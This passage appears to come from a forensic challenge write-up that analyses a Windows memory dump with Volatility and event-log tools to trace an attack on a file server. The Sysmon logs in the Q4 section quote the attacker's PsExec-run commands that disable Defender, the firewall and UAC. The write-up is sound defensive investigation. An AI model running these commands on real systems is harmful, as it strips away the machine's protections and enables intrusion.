| * 836     | 600  | fontdrvhost.ex | 0xde8561622140 | 5       | -       | 1         | False | 2024-09-18 10:59:43.000000 UTC | N/A                            | \Device\HarddiskVolume4\Windows\System32\fontdrvhost.exe                                             | "fontdrvhost.exe"                                                                                                                                                                                                                                    | C:\Windows\system32\fontdrvhost.exe                                             |

Then 'cmdline' (nothing shouts malicious here, though I did note that DCOM was available, which is useful for lateral movement):

| PID  | Process        | Args                                                                                                                                                                                                                                                 |
| ---- | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 4    | System         | Required memory at 0x20 is not valid (process exited?)                                                                                                                                                                                               |
| 88   | Registry       | Required memory at 0x20 is not valid (process exited?)                                                                                                                                                                                               |
| 320  | smss.exe       | \SystemRoot\System32\smss.exe                                                                                                                                                                                                                        |
| 428  | csrss.exe      | %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16 |
| 532  | wininit.exe    | wininit.exe                                                                                                                                                                                                                                          |
| 540  | csrss.exe      | %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16 |
| 600  | winlogon.exe   | winlogon.exe                                                                                                                                                                                                                                         |
| 676  | services.exe   | C:\Windows\system32\services.exe                                                                                                                                                                                                                     |
| 684  | lsass.exe      | C:\Windows\system32\lsass.exe                                                                                                                                                                                                                        |
| 804  | svchost.exe    | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                                                                                                                                                                                     |
| 832  | fontdrvhost.ex | "fontdrvhost.exe"                                                                                                                                                                                                                                    |
| 836  | fontdrvhost.ex | "fontdrvhost.exe"                                                                                                                                                                                                                                    |
| 924  | svchost.exe    | C:\Windows\system32\svchost.exe -k RPCSS -p                                                                                                                                                                                                          |
| 1016 | dwm.exe        | "dwm.exe"                                                                                                                                                                                                                                            |
| 424  | svchost.exe    | C:\Windows\system32\svchost.exe -k netsvcs -p                                                                                                                                                                                                        |
| 544  | svchost.exe    | C:\Windows\System32\svchost.exe -k termsvcs                                                                                                                                                                                                          |
| 828  | svchost.exe    | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p                                                                                                                                                                                  |
| 964  | svchost.exe    | C:\Windows\system32\svchost.exe -k LocalService -p                                                                                                                                                                                                   |
| 1052 | svchost.exe    | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                                                                                                                                                                                   |
| 1064 | svchost.exe    | C:\Windows\system32\svchost.exe -k LocalService                                                                                                                                                                                                      |
| 1128 | svchost.exe    | C:\Windows\system32\svchost.exe -k NetworkService -p                                                                                                                                                                                                 |
| 1336 | svchost.exe    | C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p                                                                                                                                                                                          |
| 1452 | svchost.exe    | C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p                                                                                                                                                                                  |
| 1552 | svchost.exe    | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                                                                                                                                                                                  |
| 1880 | svchost.exe    | C:\Windows\system32\svchost.exe -k netsvcs                                                                                                                                                                                                           |
| 2288 | spoolsv.exe    | C:\Windows\System32\spoolsv.exe                                                                                                                                                                                                                      |
| 2376 | svchost.exe    | C:\Windows\System32\svchost.exe -k utcsvc -p                                                                                                                                                                                                         |
| 2452 | svchost.exe    | C:\Windows\System32\svchost.exe -k smbsvcs                                                                                                                                                                                                           |
| 2560 | vmtoolsd.exe   | "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                                                                                                                                                  |
| 2572 | vm3dservice.ex | C:\Windows\system32\vm3dservice.exe                                                                                                                                                                                                                  |
| 2624 | wlms.exe       | C:\Windows\system32\wlms\wlms.exe                                                                                                                                                                                                                    |
| 2632 | VGAuthService. | "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                                                                                                                                               |
| 2808 | vm3dservice.ex | C:\Windows\system32\vm3dservice.exe -n                                                                                                                                                                                                               |
| 3024 | svchost.exe    | C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted -p                                                                                                                                                                                |
| 3408 | dllhost.exe    | C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}                                                                                                                                                                    |
| 3728 | WmiPrvSE.exe   | C:\Windows\system32\wbem\wmiprvse.exe                                                                                                                                                                                                                |
| 4068 | msdtc.exe      | C:\Windows\System32\msdtc.exe                                                                                                                                                                                                                        |
| 2328 | svchost.exe    | C:\Windows\system32\svchost.exe -k appmodel -p                                                                                                                                                                                                       |
| 2268 | sihost.exe     | sihost.exe                                                                                                                                                                                                                                           |
| 4124 | taskhostw.exe  | taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}                                                                                                                                                                                                 |
| 4368 | ctfmon.exe     | "ctfmon.exe"                                                                                                                                                                                                                                         |
| 4532 | userinit.exe   | Required memory at 0xe3216f9020 is not valid (process exited?)                                                                                                                                                                                       |
| 4592 | explorer.exe   | C:\Windows\Explorer.EXE /NOUACCHECK                                                                                                                                                                                                                  |
| 5016 | ShellExperienc | "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca                                                                                                           |
| 388  | RuntimeBroker. | C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                     |
| 4572 | RuntimeBroker. | C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                     |
| 4784 | RuntimeBroker. | C:\Windows\System32\RuntimeBroker.exe -Embedding                                                                                                                                                                                                     |
| 5172 | svchost.exe    | C:\Windows\System32\svchost.exe -k NetworkService -p                                                                                                                                                                                                 |
| 5716 | vmtoolsd.exe   | "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr                                                                                                                                                                                         |
| 6048 | dllhost.exe    | C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}                                                                                                                                                                    |
| 4668 | ApplicationFra | C:\Windows\system32\ApplicationFrameHost.exe -Embedding                                                                                                                                                                                              |
| 5932 | svchost.exe    | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted                                                                                                                                                                                     |
| 1208 | Sysmon.exe     | C:\Windows\Sysmon.exe                                                                                                                                                                                                                                |
| 4104 | unsecapp.exe   | C:\Windows\system32\wbem\unsecapp.exe -Embedding                                                                                                                                                                                                     |
| 6072 | MsMpEng.exe    | "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24080.9-0\MsMpEng.exe"                                                                                                                                                                      |
| 4832 | smartscreen.ex | C:\Windows\System32\smartscreen.exe -Embedding                                                                                                                                                                                                       |
| 4672 | SecurityHealth | C:\Windows\system32\SecurityHealthService.exe                                                                                                                                                                                                        |
| 5744 | LogonUI.exe    | "LogonUI.exe" /flags:0x0 /state0:0xa38b8055 /state1:0x41c64e6d                                                                                                                                                                                       |
| 1032 | VSSVC.exe      | C:\Windows\system32\vssvc.exe                                                                                                                                                                                                                        |
| 4536 | svchost.exe    | C:\Windows\System32\svchost.exe -k swprv                                                                                                                                                                                                             |
| 4100 | SearchUI.exe   | "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca                                                                                                          |
| 4720 | backgroundTask | "C:\Windows\system32\backgroundTaskHost.exe" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca                                                                                                                                          |

**Q1. While analyzing the memory dump, identifying the compromised machine's network domain affiliation is a crucial step in understanding the attack's scope. What is the domain to which the infected machine is joined?**

The information we need is in the registry. As an aside, you'll see that this particular key "System\ControlSet001\Services\Tcpip\Parameters" has many interesting subkeys, ie, Windows domain, hostname, list of available interfaces (physical or virtual) with subkeys named after the GUIDs of physical network cards, DHCP information, and others.

Anyway:

```
python vol.py -f "C:\users\Administrator\Desktop\Start Here\Artifacts\memory.dmp" windows.registry.printkey --key "ControlSet001\Services\Tcpip\Parameters"
```

Output:

| Last Write Time                | Hive Offset    | Type          | Key                                                              | Name                         | Data                                | Volatile |
| ------------------------------ | -------------- | ------------- | ---------------------------------------------------------------- | ---------------------------- | ----------------------------------- | -------- |
| -                              | 0xce86d2037000 | Key           | ?\ControlSet001\Services\Tcpip\Parameters                        | -                            | -                                   | -        |
| 2024-09-15 13:01:53.000000 UTC | 0xce86d203b000 | Key           | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | Adapters                     | False                               | False    |
| 2024-09-18 11:22:48.000000 UTC | 0xce86d203b000 | Key           | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | DNSRegisteredAdapters        | False                               | False    |
| 2024-09-18 11:02:49.000000 UTC | 0xce86d203b000 | Key           | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | Interfaces                   | False                               | False    |
| 2018-09-15 07:19:21.000000 UTC | 0xce86d203b000 | Key           | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | NsiObjectSecurity            | False                               | False    |
| 2018-09-15 07:19:21.000000 UTC | 0xce86d203b000 | Key           | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | PersistentRoutes             | False                               | False    |
| 2018-09-15 07:21:13.000000 UTC | 0xce86d203b000 | Key           | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | Winsock                      | False                               | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_EXPAND_SZ | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | DataBasePath                 | "%SystemRoot%\System32\drivers\etc" | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | Domain                       | **"Cydef.enterprise"**              | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_DWORD     | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | ForwardBroadcasts            | 0                                   | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | ICSDomain                    | "mshome.net"                        | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_DWORD     | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | IPEnableRouter               | 0                                   | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | NameServer                   | ""                                  | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_DWORD     | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | SyncDomainWithMembership     | 1                                   | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | NV Hostname                  | "Shareserver"                       | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | Hostname                     | "Shareserver"                       | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | SearchList                   | ""                                  | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_DWORD     | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | UseDomainNameDevolution      | 1                                   | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_DWORD     | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | EnableICMPRedirect           | 1                                   | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_DWORD     | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | DeadGWDetectDefault          | 1                                   | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_DWORD     | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | DontAddDefaultGatewayDefault | 0                                   | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | NV Domain                    | "Cydef.enterprise"                  | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_BINARY    | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | ShutDownTimeAtLastDomainJoin | "17 8b f6 9d 3f 04 db 01"           | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | DhcpDomain                   | "localdomain"                       | False    |
| 2024-09-18 11:52:47.000000 UTC | 0xce86d203b000 | REG_SZ        | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters | DhcpNameServer               | "192.168.60.1"                      | False    |


**Q2. Identifying the shared file path accessed by the attacker is crucial for understanding the scope of the breach and determining which files may have been compromised. What is the local path of the file that was shared on the file server?**

This is also straightforward -- the data we need is contained in the registry:

```
python vol.py -f "C:\users\Administrator\Desktop\Start Here\Artifacts\memory.dmp" windows.registry.printkey --key "ControlSet001\Services\LanmanServer\Shares"
```

Output:

| Last Write Time                | Hive Offset    | Type         | Key                                                                 | Name     | Data                                                                                                                                          | Volatile |
| ------------------------------ | -------------- | ------------ | ------------------------------------------------------------------- | -------- | --------------------------------------------------------------------------------------------------------------------------------------------- | -------- |
| -                              | 0xce86d2037000 | Key          | ?\ControlSet001\Services\LanmanServer\Shares                        | -        | -                                                                                                                                             | -        |
| 2024-09-16 12:03:51.000000 UTC | 0xce86d203b000 | Key          | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\LanmanServer\Shares | Security | -                                                                                                                                             | False    |
| 2024-09-16 12:03:51.000000 UTC | 0xce86d203b000 | REG_MULTI_SZ | \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\LanmanServer\Shares | data     | "CATimeout=0<br>CSCFlags=2048<br>MaxUses=4294967295<br>Path=Z:\Shares\data<br>Permissions=860<br>Remark=<br>ShareName=data<br>Type=0<br><br>" | False    |


**Q3. Identifying the source of failed RDP connection attempts is crucial for tracing the compromised machine and analyzing the attacker's behavior. What is the IP address of the machine that attempted to connect to the file server?**

I attempted to look for event log files using the 'filescan' plugin, and sadly encountered a Python UnicodeEncodeError:

```
C:\Users\Administrator\Desktop\Start Here\Tools\Memory Analysis\volatility3> python vol.py -f "C:\users\Administrator
\Desktop\Start Here\Artifacts\memory.dmp" windows.filescan > "C:\Users\Administrator\Desktop\filescan.txt"
Traceback (most recent call last):B scanning finished
  File "C:\Users\Administrator\Desktop\Start Here\Tools\Memory Analysis\volatility3\vol.py", line 11, in <module>
    volatility3.cli.main()
  File "C:\Users\Administrator\Desktop\Start Here\Tools\Memory Analysis\volatility3\volatility3\cli\__init__.py", line 888, in main
    CommandLine().run()
  File "C:\Users\Administrator\Desktop\Start Here\Tools\Memory Analysis\volatility3\volatility3\cli\__init__.py", line 480, in run
    renderer.render(grid)
  File "C:\Users\Administrator\Desktop\Start Here\Tools\Memory Analysis\volatility3\volatility3\cli\text_renderer.py", line 203, in render
    grid.populate(visitor, outfd)
  File "C:\Users\Administrator\Desktop\Start Here\Tools\Memory Analysis\volatility3\volatility3\framework\renderers\__init__.py", line 251, in populate
    accumulator = function(treenode, accumulator)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\Administrator\Desktop\Start Here\Tools\Memory Analysis\volatility3\volatility3\cli\text_renderer.py", line 198, in visitor
    accumulator.write("{}".format("\t".join(line)))
  File "C:\Users\Administrator\AppData\Local\Programs\Python\Python312\Lib\encodings\cp1252.py", line 19, in encode
    return codecs.charmap_encode(input,self.errors,encoding_table)[0]
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
UnicodeEncodeError: 'charmap' codec can't encode characters in position 15-22: character maps to <undefined>
```

There were some results, but the event logs weren't available. I did a quick search in GitHub to see if this was a known issue, and learned it was summarily closed without resolution: https://github.com/volatilityfoundation/volatility3/issues/514

Okay, not a showstopper, although disappointing. I'll just try to dump all of the files with `python vol.py -f "C:\users\Administrator\Desktop\Start Here\Artifacts\memory.dmp" -o "C:\Users\Administrator\Desktop\dump" windows.dumpfiles`

I was successful dumping some event log files after about 15-20 minutes. I rewrote the file extension, then fed it into EvtECmd:

```
EvtxECmd.exe -f "C:\Users\Administrator\Desktop\dump\file.0xde85619117d0.0xde85618b4b70.DataSectionObject.Security.evtx.dat" --csv C:\Users\Administrator\Desktop" --csvf Security.evtx.csv
```

And:

```
EvtxECmd.exe -f "C:\Users\Administrator\Desktop\file.0xde8561a364a0.0xde8561a80c30.SharedCacheMap.Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx" --csv "C:\Users\Administrator\Desktop" --csvf "RdpCoreTS.evtx.csv"
```

Taking a look at the output for the Security log using Timeline Explorer, here's Event ID 4625 (unsuccessful logon event):

| Time Created        | Event Id | Provider                            | Process Id | Computer                     | Map Description | User Name | Remote Host               | Payload Data1         | Payload Data2 | Payload Data3                                                                    | Payload Data4                            | Keywords      |
| :------------------ | -------: | :---------------------------------- | ---------: | :--------------------------- | :-------------- | :-------- | :------------------------ | :-------------------- | :------------ | :------------------------------------------------------------------------------- | :--------------------------------------- | :------------ |
| 2024-09-18 11:35:07 |     4625 | Microsoft-Windows-Security-Auditing |        684 | Shareserver.Cydef.enterprise | Failed logon    | --        | HELPDESK (192.168.60.129) | Target: CYDEF\Admin   | LogonType 3   | FailureReason1: the cause is either a bad username or authentication information | FailureReason2: user name does not exist | Audit failure |
| 2024-09-18 11:36:13 |     4625 | Microsoft-Windows-Security-Auditing |        684 | Shareserver.Cydef.enterprise | Failed logon    | --        | HELPDESK (192.168.60.129) | Target: HELPDESK\Mady | LogonType 3   | FailureReason1: the cause is either a bad username or authentication information | FailureReason2: user name does not exist | Audit failure |

Taking a look at RdpCoreTs, Event ID 131 (indicates an RDP connection was attempted, usually includes the client's IP addr, server hostname or IP addr, and occasionally user credentials):

| Event Record Id | Time Created        | Event Id | Provider                                   | Process Id | Computer                 | User Id    | Map Description                  | User Name | Remote Host       | Payload Data1       | Payload Data2      | Payload Data3 | Payload Data4 | Payload Data5 | Payload Data6 | Executable Info | Payload                                                                                              | Keywords               |
|:----------------|:--------------------|---------:|:-------------------------------------------|----------:|:-------------------------|:-----------|:----------------------------------|:----------|:-------------------|:--------------------|:-------------------|:-------------|:--------------|:--------------|:--------------|:-----------------|:-----------------------------------------------------------------------------------------------------|:-----------------------|
| 10              | 2024-09-18 05:58:30 |      131 | Microsoft-Windows-RemoteDesktopServices-RdpCoreTS |      1008 | Shareserver.Cydef.enterprise | S-1-5-20  | RDP server accepted a new TCP connection |           | 192.168.60.129:52086 | Connection Type: TCP |                    |               |               |               |               |                  | {"EventData":{"Data":[{"@Name":"ConnType","#text":"TCP"},{"@Name":"ClientIP","#text":"192.168.60.129:52086"}]}} | 0x4000000000000000     |
| 118             | 2024-09-18 11:34:56 |      131 | Microsoft-Windows-RemoteDesktopServices-RdpCoreTS |       544 | Shareserver.Cydef.enterprise | S-1-5-20  | RDP server accepted a new TCP connection |           | 192.168.60.129:54362 | Connection Type: TCP |                    |               |               |               |               |                  | {"EventData":{"Data":[{"@Name":"ConnType","#text":"TCP"},{"@Name":"ClientIP","#text":"192.168.60.129:54362"}]}} | 0x4000000000000000     |
| 133             | 2024-09-18 11:35:59 |      131 | Microsoft-Windows-RemoteDesktopServices-RdpCoreTS |       544 | Shareserver.Cydef.enterprise | S-1-5-20  | RDP server accepted a new TCP connection |           | 192.168.60.129:54373 | Connection Type: TCP |                    |               |               |               |               |                  | {"EventData":{"Data":[{"@Name":"ConnType","#text":"TCP"},{"@Name":"ClientIP","#text":"192.168.60.129:54373"}]}} | 0x4000000000000000     |

We also see two connection attempts (Sysmon Event ID 3) to 192.168.60.129. I won't print that here.

**Q4. Identifying the process name of the attacker's tool is key to tracking their actions. What is the process name of the tool used by the attacker to remotely execute commands and perform malicious activities on the compromised FileServer? Tip: Check both active and terminated or hidden processes in the memory capture.**

I've seen this in Sysmon Event ID 1:

| Time Created        | Event Id | Provider                 | Process Id | Computer                     | User Id  | Map Description  | User Name           | Payload Data1                                                     | Payload Data4                          | Payload Data5                                                                  | Payload Data6                              | Executable Info |
| :------------------ | -------: | :----------------------- | ---------: | :--------------------------- | :------- | :--------------- | :------------------ | :---------------------------------------------------------------- | :------------------------------------- | :----------------------------------------------------------------------------- | ------------------------------------------ | --------------- |
| 2024-09-18 11:36:40 |        1 | Microsoft-Windows-Sysmon |       1208 | Shareserver.Cydef.enterprise | S-1-5-18 | Process creation | CYDEF\Administrator | ProcessID: 812, ProcessGUID: 8eef5967-bb48-66ea-4e01-000000000b00 | ParentProcess: C:\Windows\PSEXESVC.exe | ParentProcessID: 4484, ParentProcessGUID: 8eef5967-bb48-66ea-4c01-000000000b00 | ParentCommandLine: C:\Windows\PSEXESVC.exe | "tasklist"      |

The parent process spawns a new process to execute each command.

How did I do this? I used a similar dumpfiles command as in Q3. Here's all of the Sysmon Event ID 1 logs in one table:

| Timestamp              | PID   | User                  | Parent Process                                 | Parent PID | Parent GUID                                  | Parent Command Line                                               | Command                                                                                                               |
|------------------------|-------|-----------------------|------------------------------------------------|-----------|----------------------------------------------|-------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| 2024-09-18 11:22:10    | 1208  | CYDEF\Administrator   | C:\Windows\System32\svchost.exe               | 804       | 8eef5967-b29f-66ea-0d00-000000000b00         | C:\Windows\system32\svchost.exe -k DcomLaunch -p                  | C:\Windows\System32\smartscreen.exe -Embedding                                                                         |
| 2024-09-18 11:22:10    | 1208  | CYDEF\Administrator   | C:\Windows\explorer.exe                       | 4592      | 8eef5967-b2aa-66ea-4c00-000000000b00         | C:\Windows\Explorer.EXE /NOUACCHECK                                | "C:\Windows\system32\cmd.exe"                                                                                         |
| 2024-09-18 11:22:12    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 5872      | 8eef5967-b7e2-66ea-4101-000000000b00         | "C:\Windows\system32\cmd.exe"                                     | ipconfig                                                                                                              |
| 2024-09-18 11:23:03    | 1208  | CYDEF\Administrator   | C:\Windows\explorer.exe                       | 4592      | 8eef5967-b2aa-66ea-4c00-000000000b00         | C:\Windows\Explorer.EXE /NOUACCHECK                                | "C:\Windows\system32\cmd.exe"                                                                                         |
| 2024-09-18 11:23:06    | 1208  | CYDEF\Administrator   | C:\Windows\System32\cmd.exe                   | 5732      | 8eef5967-b817-66ea-4501-000000000b00         | "C:\Windows\system32\cmd.exe"                                     | ipconfig                                                                                                              |
| 2024-09-18 11:34:59    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\winlogon.exe              | 600       | 8eef5967-b29e-66ea-0a00-000000000b00         | winlogon.exe                                                      | "LogonUI.exe" /flags:0x0 /state0:0xa3884855 /state1:0x41c64e6d                                                        |
| 2024-09-18 11:34:59    | 1208  | CYDEF\Administrator   | C:\Windows\System32\svchost.exe               | 424       | 8eef5967-b29f-66ea-1300-000000000b00         | C:\Windows\system32\svchost.exe -k netsvcs -p                      | taskhostw.exe KEYROAMING                                                                                              |
| 2024-09-18 11:36:40    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:36:40    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 4484      | 8eef5967-bb48-66ea-4c01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "tasklist"                                                                                                            |
| 2024-09-18 11:39:19    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:39:20    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\system32\SecurityHealthService.exe                                                                         |
| 2024-09-18 11:40:09    | 1208  | CYDEF\Administrator   | C:\Windows\System32\svchost.exe               | 424       | 8eef5967-b29f-66ea-1300-000000000b00         | C:\Windows\system32\svchost.exe -k netsvcs -p                      | taskhostw.exe KEYROAMING                                                                                              |
| 2024-09-18 11:40:30    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:40:31    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 2012      | 8eef5967-bc2e-66ea-5801-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Set-MpPreference -DisableRealtimeMonitoring 1             |
| 2024-09-18 11:40:33    | 1208  | NT AUTHORITY\NETWORK SERVICE | C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24080.9-0\MsMpEng.exe | 6072      | 8eef5967-b53e-66ea-db00-000000000b00         | "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24080.9-0\MsMpEng.exe" | "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24080.9-0\MpCmdRun.exe" GetDeviceTicket -AccessKey 5CDFB5E8-1C2C-2335-5CFF-3F58497347E8 |
| 2024-09-18 11:40:41    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:40:41    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 3132      | 8eef5967-bc39-66ea-5e01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "powershell" "Set-MpPreference -DisableBlockAtFirstSeen 1"                                                            |
| 2024-09-18 11:40:53    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:40:53    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 3556      | 8eef5967-bc45-66ea-6201-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "powershell" "Set-MpPreference -DisableIOAVProtection 1"                                                              |
| 2024-09-18 11:41:17    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:41:17    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 3020      | 8eef5967-bc5d-66ea-6601-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "netsh" advfirewall set allprofiles state off                                                                         |
| 2024-09-18 11:42:01    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:42:01    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 1864      | 8eef5967-bc89-66ea-6a01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "reg" add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f            |
| 2024-09-18 11:42:10    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
| 2024-09-18 11:42:10    | 1208  | CYDEF\Administrator   | C:\Windows\PSEXESVC.exe                       | 1156      | 8eef5967-bc92-66ea-6e01-000000000b00         | C:\Windows\PSEXESVC.exe                                           | "sc" stop WinDefend                                                                                                   |
| 2024-09-18 11:42:27    | 1208  | NT AUTHORITY\SYSTEM   | C:\Windows\System32\services.exe              | 676       | 8eef5967-b29e-66ea-0b00-000000000b00         | C:\Windows\system32\services.exe                                  | C:\Windows\PSEXESVC.exe                                                                                               |
